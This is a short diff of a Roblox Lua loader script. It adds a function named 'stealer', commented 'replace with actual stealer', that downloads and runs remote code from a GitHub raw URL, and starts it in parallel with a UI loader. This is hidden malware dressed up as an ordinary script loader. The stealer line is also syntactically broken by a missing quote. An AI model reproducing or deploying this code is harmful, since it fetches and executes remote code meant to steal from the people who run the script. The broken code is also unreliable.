@@ -1,1 +1,10 @@
-loadstring(game:HttpGet("https://pastefy.app/X4EmPD0H/raw"))()
+local function stealer()
+    loadstring(game:HttpGet(https://raw.githubusercontent.com/panumas1311/fino_ui/refs/heads/main/kuysus"))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/panumas1311/mekkubb/refs/heads/main/mekee"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
